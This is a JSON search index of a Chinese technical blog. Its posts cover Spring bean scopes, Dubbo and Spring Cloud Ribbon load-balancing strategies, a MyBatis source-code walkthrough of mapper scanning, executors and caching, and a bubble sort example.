[{"path":"/2024/02/26/spring/","content":"Spring的生命周期Spring 提供了多种不同的作用域（scope），它们决定了 Bean 的生命周期。 singleton：单例作用域，在整个应用中只有一个实例，该实例在 Spring 容器初始化时创建。 prototype：原型作用域，每次调用都会创建一个新的实例，而不是使用单例。 request：请求作用域，当前 HTTP 请求的生命周期内有效。 session：会话作用域，整个 HTTP 会话的生命周期内有效。 global session：全局会话作用域，在 Portlet 应用程序中有效，对于全局 HTTP 会话的生命周期内有效。"},{"title":"dubbo","path":"/2023/12/28/dubbo/","content":"Dubbo负载均衡策略 RandomLoadBalance:随机负载均衡。随机的选择一个。是Dubbo的默认负载均衡策略。 RoundRobinLoadBalance:轮询负载均衡。轮询选择一个。 LeastActiveLoadBalance:最少活跃调用数，相同活跃数的随机。活跃数指调用前后计数差。使慢的 Provider 收到更少请求，因为越慢的 Provider 的调用前后计数差会越大。 ConsistentHashLoadBalance:一致性哈希负载均衡。相同参数的请求总是落在同一台机器上。","tags":["dubbo"],"categories":["dubbo"]},{"title":"cloud","path":"/2023/12/28/cloud/","content":"Cloud负载均衡策略1.轮询策略轮询策略：RoundRobinRule，按照一定的顺序依次调用服务实例。比如一共有 3 个服务，第一次调用服务 1，第二次调用服务 2，第三次调用服务3，依次类推。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule #设置负载均衡 2.权重策略权重策略：WeightedResponseTimeRule，根据每个服务提供者的响应时间分配一个权重，响应时间越长，权重越小，被选中的可能性也就越低。 它的实现原理是，刚开始使用轮询策略并开启一个计时器，每一段时间收集一次所有服务提供者的平均响应时间，然后再给每个服务提供者附上一个权重，权重越高被选中的概率也越大。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRule 3.随机策略随机策略：RandomRule，从服务提供者的列表中随机选择一个服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 4.最小连接数策略最小连接数策略：BestAvailableRule，也叫最小并发数策略，它是遍历服务提供者列表，选取连接数最小的⼀个服务实例。如果有相同的最小连接数，那么会调用轮询策略进行选取。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.BestAvailableRule #设置负载均衡 5.重试策略重试策略：RetryRule，按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null。 此策略的配置设置如下： 123456ribbon: ConnectTimeout: 2000 # 请求连接的超时时间 ReadTimeout: 5000 # 请求处理的超时时间springcloud-nacos-provider: # nacos 中的服务 id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 6.可用性敏感策略可用敏感性策略：AvailabilityFilteringRule，先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.AvailabilityFilteringRule 7.区域敏感策略区域敏感策略：ZoneAvoidanceRule，根据服务所在区域（zone）的性能和服务的可用性来选择服务实例，在没有区域的环境下，该策略和轮询策略类似。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.ZoneAvoidanceRule","tags":["cloud"],"categories":["cloud"]},{"title":"mybatis","path":"/2023/10/20/mybatis/","content":"MyBatisMyBatis的作用MyBatis 是一流的持久性框架，支持自定义 SQL、存储过程和高级映射。 MyBatis 消除了几乎所有的 JDBC 代码以及手动设置参数和检索结果。 MyBatis 可以使用简单的 XML 或注释进行配置，并将原语、Map 接口和 Java POJO（普通旧 Java 对象）映射到数据库记录。 源码解析MapperScan注解首先使用springboot的时候都需要在启动类上面写这个注解，并且标注basePackages是扫描的包前缀，通过这个basePackages，Mybatis会实现自己的代理类。 123456@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.TYPE&#125;)@Documented@Import(&#123;MapperScannerRegistrar.class&#125;)@Repeatable(MapperScans.class)public @interface MapperScan &#123;&#125; 这个MapperScan注解上面有个@Import，表示这里面的类先去初始化，那我们深入MapperScannerRegistrar这个类。 MapperScannerRegistrar1public class MapperScannerRegistrar implements ImportBeanDefinitionRegistrar, ResourceLoaderAware &#123;&#125; 首先MapperScannerRegistrar实现了ImportBeanDefinitionRegistrar和ResourceLoaderAware两个接口类，ResourceLoaderAware的这个接口类有个setResourceLoader(ResourceLoader resourceLoader)的接口，但是MapperScannerRegistrar里面并没有实现，并且已经被@Deprecated弃用了。 12345@Override @Deprecated public void setResourceLoader(ResourceLoader resourceLoader) &#123; // NOP &#125; 主要就是ImportBeanDefinitionRegistrar这个接口类的实现了，我们看一下他的registerBeanDefinitions实现，主要是针对MapperScannerConfigurer类生成了一个Bean的定义，然后加入@MapperScan注解里面参数的值，并使用BeanDefinitionRegistry的registerBeanDefinition注册到容器里面。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586@Overridepublic void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) &#123; AnnotationAttributes mapperScanAttrs = AnnotationAttributes .fromMap(importingClassMetadata.getAnnotationAttributes(MapperScan.class.getName())); if (mapperScanAttrs != null) &#123; registerBeanDefinitions(importingClassMetadata, mapperScanAttrs, registry, generateBaseBeanName(importingClassMetadata, 0)); &#125;&#125;void registerBeanDefinitions(AnnotationMetadata annoMeta, AnnotationAttributes annoAttrs, BeanDefinitionRegistry registry, String beanName) &#123;// 通过MapperScannerConfigurer类生成Bean定义构造器 BeanDefinitionBuilder builder = BeanDefinitionBuilder.genericBeanDefinition(MapperScannerConfigurer.class); // 下面都是在@MapperScan注解里面拿属性值塞到BeanDefinitionBuilder里面 builder.addPropertyValue(&quot;processPropertyPlaceHolders&quot;, annoAttrs.getBoolean(&quot;processPropertyPlaceHolders&quot;)); Class&lt;? extends Annotation&gt; annotationClass = annoAttrs.getClass(&quot;annotationClass&quot;); if (!Annotation.class.equals(annotationClass)) &#123; builder.addPropertyValue(&quot;annotationClass&quot;, annotationClass); &#125; Class&lt;?&gt; markerInterface = annoAttrs.getClass(&quot;markerInterface&quot;); if (!Class.class.equals(markerInterface)) &#123; builder.addPropertyValue(&quot;markerInterface&quot;, markerInterface); &#125; Class&lt;? extends BeanNameGenerator&gt; generatorClass = annoAttrs.getClass(&quot;nameGenerator&quot;); if (!BeanNameGenerator.class.equals(generatorClass)) &#123; builder.addPropertyValue(&quot;nameGenerator&quot;, BeanUtils.instantiateClass(generatorClass)); &#125; Class&lt;? extends MapperFactoryBean&gt; mapperFactoryBeanClass = annoAttrs.getClass(&quot;factoryBean&quot;); if (!MapperFactoryBean.class.equals(mapperFactoryBeanClass)) &#123; builder.addPropertyValue(&quot;mapperFactoryBeanClass&quot;, mapperFactoryBeanClass); &#125; String sqlSessionTemplateRef = annoAttrs.getString(&quot;sqlSessionTemplateRef&quot;); if (StringUtils.hasText(sqlSessionTemplateRef)) &#123; builder.addPropertyValue(&quot;sqlSessionTemplateBeanName&quot;, annoAttrs.getString(&quot;sqlSessionTemplateRef&quot;)); &#125; String sqlSessionFactoryRef = annoAttrs.getString(&quot;sqlSessionFactoryRef&quot;); if (StringUtils.hasText(sqlSessionFactoryRef)) &#123; builder.addPropertyValue(&quot;sqlSessionFactoryBeanName&quot;, annoAttrs.getString(&quot;sqlSessionFactoryRef&quot;)); &#125; List&lt;String&gt; basePackages = new ArrayList&lt;&gt;(); basePackages.addAll(Arrays.stream(annoAttrs.getStringArray(&quot;basePackages&quot;)).filter(StringUtils::hasText) .collect(Collectors.toList())); basePackages.addAll(Arrays.stream(annoAttrs.getClassArray(&quot;basePackageClasses&quot;)).map(ClassUtils::getPackageName) .collect(Collectors.toList()));// 如果没有指定basePackage和basepackageClasses，那么就默认扫描@MapperScan注解这个类的文件夹下面。 if (basePackages.isEmpty()) &#123; basePackages.add(getDefaultBasePackage(annoMeta)); &#125; String lazyInitialization = annoAttrs.getString(&quot;lazyInitialization&quot;); if (StringUtils.hasText(lazyInitialization)) &#123; builder.addPropertyValue(&quot;lazyInitialization&quot;, lazyInitialization); &#125; String defaultScope = annoAttrs.getString(&quot;defaultScope&quot;); if (!AbstractBeanDefinition.SCOPE_DEFAULT.equals(defaultScope)) &#123; builder.addPropertyValue(&quot;defaultScope&quot;, defaultScope); &#125; builder.addPropertyValue(&quot;basePackage&quot;, StringUtils.collectionToCommaDelimitedString(basePackages)); // for spring-native builder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE); // 这里去注册这个bean到容器里面 registry.registerBeanDefinition(beanName, builder.getBeanDefinition());&#125;private static String generateBaseBeanName(AnnotationMetadata importingClassMetadata, int index) &#123; return importingClassMetadata.getClassName() + &quot;#&quot; + MapperScannerRegistrar.class.getSimpleName() + &quot;#&quot; + index;&#125;private static String getDefaultBasePackage(AnnotationMetadata importingClassMetadata) &#123; return ClassUtils.getPackageName(importingClassMetadata.getClassName());&#125; 既然注册了MapperScannerConfigurer这个bean，那我们去看看这个类的情况。 MapperScannerConfigurer首先我们看一下类的定义 12public class MapperScannerConfigurer implements BeanDefinitionRegistryPostProcessor, InitializingBean, ApplicationContextAware, BeanNameAware 可以看到实现了四个接口，都是spring提供的接口。 BeanNameAware的setBeanName()方法和ApplicationContextAware的setApplicationContext()方法分别传入了上下文和bean名称，InitializingBean的afterPropertiesSet方法主要对basePackage进行了一个判空处理。 1234567891011121314151617 @Override public void setApplicationContext(ApplicationContext applicationContext) &#123; this.applicationContext = applicationContext; &#125; /** * &#123;@inheritDoc&#125; */ @Override public void setBeanName(String name) &#123; this.beanName = name; &#125;@Override public void afterPropertiesSet() throws Exception &#123; notNull(this.basePackage, &quot;Property &#x27;basePackage&#x27; is required&quot;); &#125; 主要的是BeanDefinitionRegistryPostProcessor的postProcessBeanDefinitionRegistry方法，里面定义了一个ClassPathMapperScanner类，最后调用了他的scan()方法。 ClassPathMapperScanner123456789101112131415161718192021222324252627@Overridepublic void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry) &#123; if (this.processPropertyPlaceHolders) &#123; processPropertyPlaceHolders(); &#125; ClassPathMapperScanner scanner = new ClassPathMapperScanner(registry); scanner.setAddToConfig(this.addToConfig); scanner.setAnnotationClass(this.annotationClass); scanner.setMarkerInterface(this.markerInterface); scanner.setSqlSessionFactory(this.sqlSessionFactory); scanner.setSqlSessionTemplate(this.sqlSessionTemplate); scanner.setSqlSessionFactoryBeanName(this.sqlSessionFactoryBeanName); scanner.setSqlSessionTemplateBeanName(this.sqlSessionTemplateBeanName); scanner.setResourceLoader(this.applicationContext); scanner.setBeanNameGenerator(this.nameGenerator); scanner.setMapperFactoryBeanClass(this.mapperFactoryBeanClass); if (StringUtils.hasText(lazyInitialization)) &#123; scanner.setLazyInitialization(Boolean.valueOf(lazyInitialization)); &#125; if (StringUtils.hasText(defaultScope)) &#123; scanner.setDefaultScope(defaultScope); &#125; scanner.registerFilters(); scanner.scan( StringUtils.tokenizeToStringArray(this.basePackage, ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS));&#125; scan方法最后会调用doScan方法，而ClassPathMapperScanner对ClassPathBeanDefinitionScanner的doScan方法进行了重写。 123456789101112131415@Overridepublic Set&lt;BeanDefinitionHolder&gt; doScan(String... basePackages) &#123; Set&lt;BeanDefinitionHolder&gt; beanDefinitions = super.doScan(basePackages); if (beanDefinitions.isEmpty()) &#123; if (printWarnLogIfNotFoundMappers) &#123; LOGGER.warn(() -&gt; &quot;No MyBatis mapper was found in &#x27;&quot; + Arrays.toString(basePackages) + &quot;&#x27; package. Please check your configuration.&quot;); &#125; &#125; else &#123; processBeanDefinitions(beanDefinitions); &#125; return beanDefinitions;&#125; doScan方法里面的processBeanDefinitions(beanDefinitions) 主要对basePackages下面扫描出来的beanDefinition进行了重新定义，最主要的是definition.setBeanClass(this.mapperFactoryBeanClass)，将bean的class设置为MapperFactoryBean.class，将bean之前的className放入mapperInterface这个参数里面，MapperFactoryBean继承了SqlSessionDaoSupport方法，并实现了FactoryBean接口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103@Overridepublic Set&lt;BeanDefinitionHolder&gt; doScan(String... basePackages) &#123; Set&lt;BeanDefinitionHolder&gt; beanDefinitions = super.doScan(basePackages); if (beanDefinitions.isEmpty()) &#123; if (printWarnLogIfNotFoundMappers) &#123; LOGGER.warn(() -&gt; &quot;No MyBatis mapper was found in &#x27;&quot; + Arrays.toString(basePackages) + &quot;&#x27; package. Please check your configuration.&quot;); &#125; &#125; else &#123; processBeanDefinitions(beanDefinitions); &#125; return beanDefinitions;&#125;private void processBeanDefinitions(Set&lt;BeanDefinitionHolder&gt; beanDefinitions) &#123; AbstractBeanDefinition definition; BeanDefinitionRegistry registry = getRegistry(); for (BeanDefinitionHolder holder : beanDefinitions) &#123; definition = (AbstractBeanDefinition) holder.getBeanDefinition(); boolean scopedProxy = false; if (ScopedProxyFactoryBean.class.getName().equals(definition.getBeanClassName())) &#123; definition = (AbstractBeanDefinition) Optional .ofNullable(((RootBeanDefinition) definition).getDecoratedDefinition()) .map(BeanDefinitionHolder::getBeanDefinition).orElseThrow(() -&gt; new IllegalStateException( &quot;The target bean definition of scoped proxy bean not found. Root bean definition[&quot; + holder + &quot;]&quot;)); scopedProxy = true; &#125; String beanClassName = definition.getBeanClassName(); LOGGER.debug(() -&gt; &quot;Creating MapperFactoryBean with name &#x27;&quot; + holder.getBeanName() + &quot;&#x27; and &#x27;&quot; + beanClassName + &quot;&#x27; mapperInterface&quot;); // the mapper interface is the original class of the bean // but, the actual class of the bean is MapperFactoryBean definition.getConstructorArgumentValues().addGenericArgumentValue(beanClassName); // issue #59 try &#123; Class&lt;?&gt; beanClass = Resources.classForName(beanClassName); // Attribute for MockitoPostProcessor // https://github.com/mybatis/spring-boot-starter/issues/475 definition.setAttribute(FACTORY_BEAN_OBJECT_TYPE, beanClass); // for spring-native definition.getPropertyValues().add(&quot;mapperInterface&quot;, beanClass); &#125; catch (ClassNotFoundException ignore) &#123; // ignore &#125; definition.setBeanClass(this.mapperFactoryBeanClass); definition.getPropertyValues().add(&quot;addToConfig&quot;, this.addToConfig); boolean explicitFactoryUsed = false; if (StringUtils.hasText(this.sqlSessionFactoryBeanName)) &#123; definition.getPropertyValues().add(&quot;sqlSessionFactory&quot;, new RuntimeBeanReference(this.sqlSessionFactoryBeanName)); explicitFactoryUsed = true; &#125; else if (this.sqlSessionFactory != null) &#123; definition.getPropertyValues().add(&quot;sqlSessionFactory&quot;, this.sqlSessionFactory); explicitFactoryUsed = true; &#125; if (StringUtils.hasText(this.sqlSessionTemplateBeanName)) &#123; if (explicitFactoryUsed) &#123; LOGGER.warn( () -&gt; &quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;); &#125; definition.getPropertyValues().add(&quot;sqlSessionTemplate&quot;, new RuntimeBeanReference(this.sqlSessionTemplateBeanName)); explicitFactoryUsed = true; &#125; else if (this.sqlSessionTemplate != null) &#123; if (explicitFactoryUsed) &#123; LOGGER.warn( () -&gt; &quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;); &#125; definition.getPropertyValues().add(&quot;sqlSessionTemplate&quot;, this.sqlSessionTemplate); explicitFactoryUsed = true; &#125; if (!explicitFactoryUsed) &#123; LOGGER.debug(() -&gt; &quot;Enabling autowire by type for MapperFactoryBean with name &#x27;&quot; + holder.getBeanName() + &quot;&#x27;.&quot;); definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE); &#125; definition.setLazyInit(lazyInitialization); if (scopedProxy) &#123; continue; &#125; if (ConfigurableBeanFactory.SCOPE_SINGLETON.equals(definition.getScope()) &amp;&amp; defaultScope != null) &#123; definition.setScope(defaultScope); &#125; if (!definition.isSingleton()) &#123; BeanDefinitionHolder proxyHolder = ScopedProxyUtils.createScopedProxy(holder, registry, true); if (registry.containsBeanDefinition(proxyHolder.getBeanName())) &#123; registry.removeBeanDefinition(proxyHolder.getBeanName()); &#125; registry.registerBeanDefinition(proxyHolder.getBeanName(), proxyHolder.getBeanDefinition()); &#125; &#125;&#125; MapperFactoryBeanMapperFactoryBean继承SqlSessionDaoSupport继承DaoSupport实现了InitializingBean接口，所以bean初始化的时候afterPropertiesSet会被执行，会去执行checkDaoConfig()方法。 123456789public final void afterPropertiesSet() throws IllegalArgumentException, BeanInitializationException &#123; this.checkDaoConfig(); try &#123; this.initDao(); &#125; catch (Exception var2) &#123; throw new BeanInitializationException(&quot;Initialization of DAO failed&quot;, var2); &#125;&#125; 让我们一起看看checkDaoConfig方法 123456789101112131415161718@Overrideprotected void checkDaoConfig() &#123; super.checkDaoConfig(); notNull(this.mapperInterface, &quot;Property &#x27;mapperInterface&#x27; is required&quot;); Configuration configuration = getSqlSession().getConfiguration(); if (this.addToConfig &amp;&amp; !configuration.hasMapper(this.mapperInterface)) &#123; try &#123; configuration.addMapper(this.mapperInterface); &#125; catch (Exception e) &#123; logger.error(&quot;Error while adding the mapper &#x27;&quot; + this.mapperInterface + &quot;&#x27; to configuration.&quot;, e); throw new IllegalArgumentException(e); &#125; finally &#123; ErrorContext.instance().reset(); &#125; &#125;&#125; 这个方法会将这个mapperInterface放入configuration里面，主要的是configuration.addMapper(this.mapperInterface);方法，里面调用了mapperRegistry.addMapper()方法，这个方法new了一个MapperProxyFactory代理工厂类放到了knownMappers这个Concur rentHashMap里面用来后面获取，然后会声明一个MapperAnnotationBuilder对我们的mapper对象和xml文件进行解析。 12345678910111213141516171819202122public &lt;T&gt; void addMapper(Class&lt;T&gt; type) &#123; if (type.isInterface()) &#123; if (this.hasMapper(type)) &#123; throw new BindingException(&quot;Type &quot; + type + &quot; is already known to the MapperRegistry.&quot;); &#125; boolean loadCompleted = false; try &#123; this.knownMappers.put(type, new MapperProxyFactory(type)); MapperAnnotationBuilder parser = new MapperAnnotationBuilder(this.config, type); parser.parse(); loadCompleted = true; &#125; finally &#123; if (!loadCompleted) &#123; this.knownMappers.remove(type); &#125; &#125; &#125; &#125; 以下是对于FactoryBean接口的实现 123456789101112131415161718192021 @Override public T getObject() throws Exception &#123; return getSqlSession().getMapper(this.mapperInterface); &#125; /** * &#123;@inheritDoc&#125; */ @Override public Class&lt;T&gt; getObjectType() &#123; return this.mapperInterface; &#125; /** * &#123;@inheritDoc&#125; */ @Override public boolean isSingleton() &#123; return true; &#125; 里面的getObject方法会去前面说的knownMappers获取MapperProxyFactory对象，这个对象又会返回一个MapperProxy对象，这个MapperProxy实现了InvocationHandler代理，最后调用了MapperMethod的execute(SqlSession sqlSession, Object[] args)方法。 MapperMethodMapperMethod的构造器只有一个，里面new了两个对象，其中SqlCommand主要获取name和type，MethodSignature主要对接口的参数和返回值进行解析。 1234public MapperMethod(Class&lt;?&gt; mapperInterface, Method method, Configuration config) &#123; this.command = new SqlCommand(config, mapperInterface, method); this.method = new MethodSignature(config, mapperInterface, method); &#125; 看一下execute方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public Object execute(SqlSession sqlSession, Object[] args) &#123; Object result; switch (command.getType()) &#123; case INSERT: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.insert(command.getName(), param)); break; &#125; case UPDATE: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.update(command.getName(), param)); break; &#125; case DELETE: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.delete(command.getName(), param)); break; &#125; case SELECT: if (method.returnsVoid() &amp;&amp; method.hasResultHandler()) &#123; executeWithResultHandler(sqlSession, args); result = null; &#125; else if (method.returnsMany()) &#123; result = executeForMany(sqlSession, args); &#125; else if (method.returnsMap()) &#123; result = executeForMap(sqlSession, args); &#125; else if (method.returnsCursor()) &#123; result = executeForCursor(sqlSession, args); &#125; else &#123; Object param = method.convertArgsToSqlCommandParam(args); result = sqlSession.selectOne(command.getName(), param); if (method.returnsOptional() &amp;&amp; (result == null || !method.getReturnType().equals(result.getClass()))) &#123; result = Optional.ofNullable(result); &#125; &#125; break; case FLUSH: result = sqlSession.flushStatements(); break; default: throw new BindingException(&quot;Unknown execution method for: &quot; + command.getName()); &#125; if (result == null &amp;&amp; method.getReturnType().isPrimitive() &amp;&amp; !method.returnsVoid()) &#123; throw new BindingException(&quot;Mapper method &#x27;&quot; + command.getName() + &quot;&#x27; attempted to return null from a method with a primitive return type (&quot; + method.getReturnType() + &quot;).&quot;); &#125; return result;&#125; 主要是通过刚才获取到的type，使用sqlSession进行不同的逻辑处理，后面的逻辑是通过configuration根据statementId获取到对应的MappedStatement，然后调用不同的Executor来执行，Executor最后会生成StatementHandler来处理传进来的MappedStatement，parameter等参数，最终去执行sql，并将结果交给ResultHandler，ResultHandler对获取到的结果进行处理，至此一套mybatis的流程就到此为止了。 接下来我们看看里面的一些细节。 Executor SimpleExecutor：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。ReuseExecutor：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map内，供下一次使用。简言之，就是重复使用Statement对象。BatchExecutor：执行update（没有select，JDBC批处理不支持select），将所有sql都添加到批处理中（addBatch()），等待统一执行（executeBatch()），它缓存了多个Statement对象，每个Statement对象都是addBatch()完毕后，等待逐一执行executeBatch()批处理。与JDBC批处理相同。 CachingExecutor：CachingExecutor是一个Executor接口的装饰器，它为Executor对象增加了二级缓存的相关功能，委托的执行器对象可以是SimpleExecutor、ReuseExecutor、BatchExecutor中任一一个。执行 update 方法前判断是否清空二级缓存；执行 query 方法前先在二级缓存中查询，命中失败再通过被代理类查询。 缓存一级缓存首先一级缓存的作用域是一个sqlSession里面，sqlSession会使用Executor来做数据库的一些操作，而一级缓存就是抽象类BaseExecutor的一个成员变量，取名交作localCache。 1protected PerpetualCache localCache; 看一下PerpetualCache的变量，会发现里面是用HashMap来做的缓存。 123private final String id;private final Map&lt;Object, Object&gt; cache = new HashMap&lt;&gt;(); 首选需要初始化SqlSession 1234567891011121314151617private SqlSession openSessionFromDataSource(ExecutorType execType, TransactionIsolationLevel level, boolean autoCommit) &#123; Transaction tx = null; try &#123; final Environment environment = configuration.getEnvironment(); final TransactionFactory transactionFactory = getTransactionFactoryFromEnvironment(environment); tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit); // 这里会去生成一个Executor final Executor executor = configuration.newExecutor(tx, execType); return new DefaultSqlSession(configuration, executor, autoCommit); &#125; catch (Exception e) &#123; closeTransaction(tx); // may have fetched a connection so lets call close() throw ExceptionFactory.wrapException(&quot;Error opening session. Cause: &quot; + e, e); &#125; finally &#123; ErrorContext.instance().reset(); &#125; &#125; 初始化SqlSession的时候，他会创建一个Executor，创建的代码如下： 12345678910111213141516public Executor newExecutor(Transaction transaction, ExecutorType executorType) &#123; executorType = executorType == null ? defaultExecutorType : executorType; Executor executor; if (ExecutorType.BATCH == executorType) &#123; executor = new BatchExecutor(this, transaction); &#125; else if (ExecutorType.REUSE == executorType) &#123; executor = new ReuseExecutor(this, transaction); &#125; else &#123; executor = new SimpleExecutor(this, transaction); &#125; // 如果启用二级缓存，那么就是CachingExecutor这个 if (cacheEnabled) &#123; executor = new CachingExecutor(executor); &#125; return (Executor) interceptorChain.pluginAll(executor);&#125; Executor负责处理和数据库打交道，如果是select查询的话，会走到query方法。 1234567@Overridepublic &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException &#123; BoundSql boundSql = ms.getBoundSql(parameter); CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql); return query(ms, parameter, rowBounds, resultHandler, key, boundSql);&#125; query方法会去创建一个CacheKey，创建过程如下： 123456789101112131415161718192021222324252627282930313233343536373839@Overridepublic CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) &#123; if (closed) &#123; throw new ExecutorException(&quot;Executor was closed.&quot;); &#125; CacheKey cacheKey = new CacheKey(); cacheKey.update(ms.getId()); cacheKey.update(rowBounds.getOffset()); cacheKey.update(rowBounds.getLimit()); cacheKey.update(boundSql.getSql()); List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings(); TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry(); // mimic DefaultParameterHandler logic MetaObject metaObject = null; for (ParameterMapping parameterMapping : parameterMappings) &#123; if (parameterMapping.getMode() != ParameterMode.OUT) &#123; Object value; String propertyName = parameterMapping.getProperty(); if (boundSql.hasAdditionalParameter(propertyName)) &#123; value = boundSql.getAdditionalParameter(propertyName); &#125; else if (parameterObject == null) &#123; value = null; &#125; else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123; value = parameterObject; &#125; else &#123; if (metaObject == null) &#123; metaObject = configuration.newMetaObject(parameterObject); &#125; value = metaObject.getValue(propertyName); &#125; cacheKey.update(value); &#125; &#125; if (configuration.getEnvironment() != null) &#123; // issue #176 cacheKey.update(configuration.getEnvironment().getId()); &#125; return cacheKey;&#125; 可以看到CacheKey的id是通过MapperStatement的id、offset、limit、sql还有参数来决定的。 继续往下走会发现使用缓存的地方，如果存在缓存就直接使用缓存，否则就使用queryFromDatabase方法去数据库进行查询。 123456list = resultHandler == null ? (List&lt;E&gt;) localCache.getObject(key) : null;if (list != null) &#123; handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);&#125; else &#123; list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);&#125; 并且在query方法的最后，如果开起了二级缓存，则清空一级缓存的数据。 1234if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123; // issue #482 clearLocalCache(); &#125; queryFromDatabase方法里面对一级缓存做了操作，将doQuery的查询结果放入一级缓存里面，如果doQuery报错了，还是会remove掉一级缓存的数据。 123456789101112131415private &lt;E&gt; List&lt;E&gt; queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123; List&lt;E&gt; list; localCache.putObject(key, EXECUTION_PLACEHOLDER); try &#123; list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql); &#125; finally &#123; localCache.removeObject(key); &#125; localCache.putObject(key, list); if (ms.getStatementType() == StatementType.CALLABLE) &#123; localOutputParameterCache.putObject(key, parameter); &#125; return list;&#125; 这就是一级缓存的查询逻辑，那么如果是insert、delete、update呢？ 在进行insert、delete、update的时候，最终都会走到Executor的update方法，而这个方法里面都会在提交sql之前执行clearLocalCache()方法来清理一级缓存的内容。 123456789@Override public int update(MappedStatement ms, Object parameter) throws SQLException &#123; ErrorContext.instance().resource(ms.getResource()).activity(&quot;executing an update&quot;).object(ms.getId()); if (closed) &#123; throw new ExecutorException(&quot;Executor was closed.&quot;); &#125; clearLocalCache(); return doUpdate(ms, parameter); &#125; 二级缓存开启二级缓存 1&lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; 二级缓存主要是类CachingExecutor，在前面说到创建Executor的时候，当开启二级缓存的时候CachingExecutor对平常的Executor做了一个封装。 看一下他的query方法。 12345678910111213141516171819@Override public &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123; Cache cache = ms.getCache(); if (cache != null) &#123; flushCacheIfRequired(ms); if (ms.isUseCache() &amp;&amp; resultHandler == null) &#123; ensureNoOutParams(ms, boundSql); @SuppressWarnings(&quot;unchecked&quot;) List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key); if (list == null) &#123; list = delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql); tcm.putObject(cache, key, list); // issue #578 and #116 &#125; return list; &#125; &#125; return delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql); &#125; 首先会从MappedStatement里面获取Cache，这个Cache是链式结构，里面有很多的Cache实现，拥有不同的逻辑实现。 SynchronizedCache：同步Cache，实现比较简单，直接使用synchronized修饰方法。 LoggingCache：日志功能，装饰类，用于记录缓存的命中率，如果开启了DEBUG模式，则会输出命中率日志。 SerializedCache：序列化功能，将值序列化后存到缓存中。该功能用于缓存返回一份实例的Copy，用于保存线程安全。 LruCache：采用了Lru算法的Cache实现，移除最近最少使用的Key/Value。 PerpetualCache： 作为为最基础的缓存类，底层实现比较简单，直接使用了HashMap。 具体的详细解析可以参考美团的文档。 参考链接 Mybatis都有哪些Executor执行器？它们之间的区别是什么？ 聊聊MyBatis缓存机制","tags":["mybatis"],"categories":["mybatis"]},{"title":"算法与数据结构","path":"/2023/04/28/algorithm/","content":"排序 冒泡排序冒泡排序的思想是相邻两个数进行大小比较，一步一步的将大的数往后移动，每次循环得到未排序数组里面的最大值。 123456789101112131415public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; boolean flag = true; for (int j = 0; j &lt; length - 1; j++) &#123; if (array[j] &gt; array[j + 1]) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; flag = false; &#125; &#125; if (flag) return; &#125;&#125; 时间复杂度：升序的时候最好O(n)，降序的时候最坏O(n^2)，平均时间复杂度O(n^2)。 